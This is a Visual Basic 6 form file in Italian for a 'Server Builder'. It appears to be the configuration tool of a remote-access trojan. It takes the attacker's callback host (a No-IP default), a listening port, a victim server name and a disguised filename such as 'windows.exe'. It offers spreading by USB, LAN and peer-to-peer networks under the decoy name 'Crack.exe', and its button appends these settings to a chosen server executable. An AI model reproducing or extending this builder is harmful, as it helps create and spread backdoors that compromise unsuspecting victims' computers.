VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "Comdlg32.ocx"
Begin VB.Form Form3 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Server Builder"
   ClientHeight    =   3780
   ClientLeft      =   45
   ClientTop       =   315
   ClientWidth     =   10305
   LinkTopic       =   "Form3"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3780
   ScaleWidth      =   10305
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox Text10 
      BorderStyle     =   0  'None
      Height          =   285
      Left            =   9720
      TabIndex        =   24
      Text            =   "0"
      Top             =   2400
      Width           =   495
   End
   Begin VB.TextBox Text9 
      BorderStyle     =   0  'None
      Height          =   285
      Left            =   9720
      TabIndex        =   23
      Text            =   "0"
      Top             =   2040
      Width           =   495
   End
   Begin VB.TextBox Text8 
      BorderStyle     =   0  'None
      Height          =   285
      Left            =   9720
      TabIndex        =   22
      Text            =   "0"
      Top             =   1680
      Width           =   495
   End
   Begin VB.TextBox Text7 
      BorderStyle     =   0  'None
      Height          =   285
      Left            =   9720
      TabIndex        =   21
      Text            =   "0"
      Top             =   1320
      Width           =   495
   End
   Begin VB.TextBox Text6 
      BorderStyle     =   0  'None
      Height          =   285
      Left            =   9720
      TabIndex        =   20
      Text            =   "0"
      Top             =   960
      Width           =   495
   End
   Begin VB.TextBox Text5 
      Height          =   285
      Left            =   6720
      TabIndex        =   18
      Text            =   "Crack.exe"
      Top             =   3240
      Width           =   2655
   End
   Begin VB.CheckBox Check5 
      Caption         =   "My Grokster"
      Height          =   375
      Left            =   5040
      TabIndex        =   17
      Top             =   3120
      Width           =   1335
   End
   Begin VB.CheckBox Check4 
      Caption         =   "Network (Lan)"
      Height          =   495
      Left            =   7200
      TabIndex        =   15
      Top             =   2400
      Width           =   1575
   End
   Begin VB.CheckBox Check3 
      Caption         =   "Emule"
      Height          =   495
      Left            =   5040
      TabIndex        =   14
      Top             =   2400
      Width           =   1335
   End
   Begin VB.CheckBox Check2 
      Caption         =   "LimeWire Diffusione"
      Height          =   615
      Left            =   7200
      TabIndex        =   13
      Top             =   1800
      Width           =   1815
   End
   Begin VB.CheckBox Check1 
      Caption         =   "Diffusione Usb"
      Height          =   375
      Left            =   5040
      TabIndex        =   12
      Top             =   1920
      Width           =   1575
   End
   Begin VB.TextBox Text4 
      Height          =   285
      Left            =   5040
      TabIndex        =   9
      Text            =   "windows.exe"
      Top             =   840
      Width           =   3135
   End
   Begin MSComDlg.CommonDialog CD 
      Left            =   3720
      Top             =   0
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Crea Server"
      Height          =   375
      Left            =   1200
      TabIndex        =   6
      Top             =   3240
      Width           =   2895
   End
   Begin VB.TextBox Text3 
      Height          =   285
      Left            =   120
      TabIndex        =   5
      Text            =   "vittima"
      Top             =   2520
      Width           =   4215
   End
   Begin VB.TextBox Text2 
      Height          =   285
      Left            =   120
      TabIndex        =   3
      Text            =   "5000"
      Top             =   1680
      Width           =   4215
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   120
      TabIndex        =   1
      Text            =   "127.0.0.1/tuosito.no-ip.org"
      Top             =   840
      Width           =   4215
   End
   Begin VB.Label Label9 
      AutoSize        =   -1  'True
      Caption         =   "Nome File Diffusione"
      Height          =   195
      Left            =   7320
      TabIndex        =   19
      Top             =   3000
      Width           =   1455
   End
   Begin VB.Line Line3 
      X1              =   7440
      X2              =   9480
      Y1              =   1680
      Y2              =   1680
   End
   Begin VB.Label Label8 
      AutoSize        =   -1  'True
      Caption         =   "Diffusione"
      Height          =   195
      Left            =   6720
      TabIndex        =   16
      Top             =   1560
      Width           =   705
   End
   Begin VB.Line Line2 
      X1              =   4800
      X2              =   6720
      Y1              =   1680
      Y2              =   1680
   End
   Begin VB.Label Label7 
      AutoSize        =   -1  'True
      Caption         =   "Ricordati Di Mettere L'estensione "".exe"""
      Height          =   195
      Left            =   5160
      TabIndex        =   11
      Top             =   1200
      Width           =   2835
   End
   Begin VB.Label Label6 
      AutoSize        =   -1  'True
      Caption         =   "Nome Del File"
      Height          =   195
      Left            =   5160
      TabIndex        =   10
      Top             =   480
      Width           =   990
   End
   Begin VB.Label Label5 
      AutoSize        =   -1  'True
      Caption         =   "Caratteristiche"
      Height          =   195
      Left            =   6600
      TabIndex        =   8
      Top             =   120
      Width           =   1005
   End
   Begin VB.Label Label4 
      AutoSize        =   -1  'True
      Caption         =   "Connessione"
      Height          =   195
      Left            =   1320
      TabIndex        =   7
      Top             =   120
      Width           =   915
   End
   Begin VB.Line Line1 
      X1              =   4800
      X2              =   4800
      Y1              =   0
      Y2              =   3840
   End
   Begin VB.Label Label3 
      AutoSize        =   -1  'True
      Caption         =   "Nome Server"
      Height          =   195
      Left            =   120
      TabIndex        =   4
      Top             =   2280
      Width           =   930
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      Caption         =   "Porta Di Ascolto (Default 5000)"
      Height          =   195
      Left            =   120
      TabIndex        =   2
      Top             =   1320
      Width           =   2190
   End
   Begin VB.Label Label1 
      Caption         =   "Tuo Dns/IP o tuo No-IP"
      Height          =   255
      Left            =   120
      TabIndex        =   0
      Top             =   480
      Width           =   1695
   End
End
Attribute VB_Name = "Form3"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim std As String

Private Sub Command1_Click()
CD.DialogTitle = "Selziona Il Server"
CD.Filter = "*.exe"
CD.ShowOpen
Open CD.FileName For Binary As #1
std = Space(LOF(1))
Get #1, , std
Put #1, , std & "(Dil)"
Put #1, , Text1.Text & "(Dil)"
Put #1, , Text2.Text & "(Dil)"
Put #1, , Text3.Text & "(Dil)"
Put #1, , Text4.Text & "(Dil)"

MsgBox "Il Server è Stato Creato Con Successo Riavvia Il Client per completare il procedimento", vbInformation, "Successo"
End


End Sub

